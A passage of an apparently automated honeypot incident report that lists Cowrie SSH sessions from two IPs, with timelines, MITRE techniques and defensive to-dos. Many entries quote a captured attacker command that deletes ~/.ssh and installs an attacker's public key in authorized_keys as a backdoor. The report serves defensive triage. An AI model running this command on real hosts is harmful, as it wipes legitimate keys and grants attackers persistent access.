| `2026-06-13 06:12:13` | `cowrie.command.failed` |
| `2026-06-13 06:12:14` | `cowrie.log.closed` |
| `2026-06-13 06:12:14` | `cowrie.session.params` |
| `2026-06-13 06:12:14` | `cowrie.command.input` |
| `2026-06-13 06:12:14` | `cowrie.session.file_download` |
| `2026-06-13 06:12:14` | `cowrie.log.closed` |
| `2026-06-13 06:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-051ebf877ad4

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:12 |
| **Last Seen** | 2026-06-13 06:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:12:16` | `cowrie.session.connect` |
| `2026-06-13 06:12:16` | `cowrie.client.version` |
| `2026-06-13 06:12:16` | `cowrie.client.kex` |
| `2026-06-13 06:12:17` | `cowrie.login.success` |
| `2026-06-13 06:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19cfc8d77ce2

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:13 |
| **Last Seen** | 2026-06-13 06:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:13:34` | `cowrie.session.connect` |
| `2026-06-13 06:13:34` | `cowrie.client.version` |
| `2026-06-13 06:13:34` | `cowrie.client.kex` |
| `2026-06-13 06:13:34` | `cowrie.login.success` |
| `2026-06-13 06:13:35` | `cowrie.session.params` |
| `2026-06-13 06:13:35` | `cowrie.command.input` |
| `2026-06-13 06:13:35` | `cowrie.command.failed` |
| `2026-06-13 06:13:35` | `cowrie.log.closed` |
| `2026-06-13 06:13:35` | `cowrie.session.params` |
| `2026-06-13 06:13:35` | `cowrie.command.input` |
| `2026-06-13 06:13:35` | `cowrie.session.file_download` |
| `2026-06-13 06:13:35` | `cowrie.log.closed` |
| `2026-06-13 06:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4faf6e3169a

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:13 |
| **Last Seen** | 2026-06-13 06:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:13:37` | `cowrie.session.connect` |
| `2026-06-13 06:13:37` | `cowrie.client.version` |
| `2026-06-13 06:13:38` | `cowrie.client.kex` |
| `2026-06-13 06:13:38` | `cowrie.login.success` |
| `2026-06-13 06:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23896a7586a8

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:14 |
| **Last Seen** | 2026-06-13 06:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:14:14` | `cowrie.session.connect` |
| `2026-06-13 06:14:14` | `cowrie.client.version` |
| `2026-06-13 06:14:14` | `cowrie.client.kex` |
| `2026-06-13 06:14:15` | `cowrie.login.success` |
| `2026-06-13 06:14:15` | `cowrie.session.params` |
| `2026-06-13 06:14:15` | `cowrie.command.input` |
| `2026-06-13 06:14:15` | `cowrie.command.failed` |
| `2026-06-13 06:14:15` | `cowrie.log.closed` |
| `2026-06-13 06:14:16` | `cowrie.session.params` |
| `2026-06-13 06:14:16` | `cowrie.command.input` |
| `2026-06-13 06:14:16` | `cowrie.session.file_download` |
| `2026-06-13 06:14:16` | `cowrie.log.closed` |
| `2026-06-13 06:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dc203db5d4a

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:14 |
| **Last Seen** | 2026-06-13 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:14:18` | `cowrie.session.connect` |
| `2026-06-13 06:14:18` | `cowrie.client.version` |
| `2026-06-13 06:14:18` | `cowrie.client.kex` |
| `2026-06-13 06:14:19` | `cowrie.login.success` |
| `2026-06-13 06:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9d65fc94955

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:15 |
| **Last Seen** | 2026-06-13 06:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:15:59` | `cowrie.session.connect` |
| `2026-06-13 06:15:59` | `cowrie.client.version` |
| `2026-06-13 06:15:59` | `cowrie.client.kex` |
| `2026-06-13 06:16:00` | `cowrie.login.success` |
| `2026-06-13 06:16:00` | `cowrie.session.params` |
| `2026-06-13 06:16:00` | `cowrie.command.input` |
| `2026-06-13 06:16:00` | `cowrie.command.failed` |
| `2026-06-13 06:16:00` | `cowrie.log.closed` |
| `2026-06-13 06:16:00` | `cowrie.session.params` |
| `2026-06-13 06:16:00` | `cowrie.command.input` |
| `2026-06-13 06:16:00` | `cowrie.session.file_download` |
| `2026-06-13 06:16:00` | `cowrie.log.closed` |
| `2026-06-13 06:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9a4299b9e2

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:16 |
| **Last Seen** | 2026-06-13 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:16:03` | `cowrie.session.connect` |
| `2026-06-13 06:16:03` | `cowrie.client.version` |
| `2026-06-13 06:16:03` | `cowrie.client.kex` |
| `2026-06-13 06:16:03` | `cowrie.login.success` |
| `2026-06-13 06:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71d4a41703f2

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:18 |
| **Last Seen** | 2026-06-13 06:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:18:22` | `cowrie.session.connect` |
| `2026-06-13 06:18:22` | `cowrie.client.version` |
| `2026-06-13 06:18:22` | `cowrie.client.kex` |
| `2026-06-13 06:18:23` | `cowrie.login.success` |
| `2026-06-13 06:18:23` | `cowrie.session.params` |
| `2026-06-13 06:18:23` | `cowrie.command.input` |
| `2026-06-13 06:18:23` | `cowrie.command.failed` |
| `2026-06-13 06:18:24` | `cowrie.log.closed` |
| `2026-06-13 06:18:24` | `cowrie.session.params` |
| `2026-06-13 06:18:24` | `cowrie.command.input` |
| `2026-06-13 06:18:24` | `cowrie.session.file_download` |
| `2026-06-13 06:18:24` | `cowrie.log.closed` |
| `2026-06-13 06:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22b951e7c797

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:18 |
| **Last Seen** | 2026-06-13 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:18:26` | `cowrie.session.connect` |
| `2026-06-13 06:18:26` | `cowrie.client.version` |
| `2026-06-13 06:18:27` | `cowrie.client.kex` |
| `2026-06-13 06:18:27` | `cowrie.login.success` |
| `2026-06-13 06:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94096bd2285b

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:21 |
| **Last Seen** | 2026-06-13 06:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:21:15` | `cowrie.session.connect` |
| `2026-06-13 06:21:15` | `cowrie.client.version` |
| `2026-06-13 06:21:15` | `cowrie.client.kex` |
| `2026-06-13 06:21:16` | `cowrie.login.success` |
| `2026-06-13 06:21:16` | `cowrie.session.params` |
| `2026-06-13 06:21:16` | `cowrie.command.input` |
| `2026-06-13 06:21:16` | `cowrie.command.failed` |
| `2026-06-13 06:21:17` | `cowrie.log.closed` |
| `2026-06-13 06:21:17` | `cowrie.session.params` |
| `2026-06-13 06:21:17` | `cowrie.command.input` |
| `2026-06-13 06:21:17` | `cowrie.session.file_download` |
| `2026-06-13 06:21:17` | `cowrie.log.closed` |
| `2026-06-13 06:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0346287d3b1d

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:21 |
| **Last Seen** | 2026-06-13 06:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:21:19` | `cowrie.session.connect` |
| `2026-06-13 06:21:19` | `cowrie.client.version` |
| `2026-06-13 06:21:19` | `cowrie.client.kex` |
| `2026-06-13 06:21:20` | `cowrie.login.success` |
| `2026-06-13 06:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c357ef8ff6c3

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:22 |
| **Last Seen** | 2026-06-13 06:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:22:30` | `cowrie.session.connect` |
| `2026-06-13 06:22:30` | `cowrie.client.version` |
| `2026-06-13 06:22:31` | `cowrie.client.kex` |
| `2026-06-13 06:22:31` | `cowrie.login.success` |
| `2026-06-13 06:22:32` | `cowrie.session.params` |
| `2026-06-13 06:22:32` | `cowrie.command.input` |
| `2026-06-13 06:22:32` | `cowrie.command.failed` |
| `2026-06-13 06:22:32` | `cowrie.log.closed` |
| `2026-06-13 06:22:32` | `cowrie.session.params` |
| `2026-06-13 06:22:32` | `cowrie.command.input` |
| `2026-06-13 06:22:32` | `cowrie.session.file_download` |
| `2026-06-13 06:22:32` | `cowrie.log.closed` |
| `2026-06-13 06:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1866b1e1729f

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:22 |
| **Last Seen** | 2026-06-13 06:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:22:35` | `cowrie.session.connect` |
| `2026-06-13 06:22:35` | `cowrie.client.version` |
| `2026-06-13 06:22:35` | `cowrie.client.kex` |
| `2026-06-13 06:22:35` | `cowrie.login.success` |
| `2026-06-13 06:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5976d45603a0

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:24 |
| **Last Seen** | 2026-06-13 06:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:24:31` | `cowrie.session.connect` |
| `2026-06-13 06:24:31` | `cowrie.client.version` |
| `2026-06-13 06:24:31` | `cowrie.client.kex` |
| `2026-06-13 06:24:32` | `cowrie.login.success` |
| `2026-06-13 06:24:32` | `cowrie.session.params` |
| `2026-06-13 06:24:32` | `cowrie.command.input` |
| `2026-06-13 06:24:32` | `cowrie.command.failed` |
| `2026-06-13 06:24:33` | `cowrie.log.closed` |
| `2026-06-13 06:24:33` | `cowrie.session.params` |
| `2026-06-13 06:24:33` | `cowrie.command.input` |
| `2026-06-13 06:24:33` | `cowrie.session.file_download` |
| `2026-06-13 06:24:33` | `cowrie.log.closed` |
| `2026-06-13 06:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22293b63103d

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:24 |
| **Last Seen** | 2026-06-13 06:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:24:35` | `cowrie.session.connect` |
| `2026-06-13 06:24:35` | `cowrie.client.version` |
| `2026-06-13 06:24:35` | `cowrie.client.kex` |
| `2026-06-13 06:24:36` | `cowrie.login.success` |
| `2026-06-13 06:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-473fd4a8f811

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:26 |
| **Last Seen** | 2026-06-13 06:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:26:26` | `cowrie.session.connect` |
| `2026-06-13 06:26:26` | `cowrie.client.version` |
| `2026-06-13 06:26:27` | `cowrie.client.kex` |
| `2026-06-13 06:26:27` | `cowrie.login.success` |
| `2026-06-13 06:26:27` | `cowrie.session.params` |
| `2026-06-13 06:26:27` | `cowrie.command.input` |
| `2026-06-13 06:26:27` | `cowrie.command.failed` |
| `2026-06-13 06:26:28` | `cowrie.log.closed` |
| `2026-06-13 06:26:28` | `cowrie.session.params` |
| `2026-06-13 06:26:28` | `cowrie.command.input` |
| `2026-06-13 06:26:28` | `cowrie.session.file_download` |
| `2026-06-13 06:26:28` | `cowrie.log.closed` |
| `2026-06-13 06:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf5fbe0af8b

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:26 |
| **Last Seen** | 2026-06-13 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:26:30` | `cowrie.session.connect` |
| `2026-06-13 06:26:30` | `cowrie.client.version` |
| `2026-06-13 06:26:30` | `cowrie.client.kex` |
| `2026-06-13 06:26:31` | `cowrie.login.success` |
| `2026-06-13 06:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db6050406ed

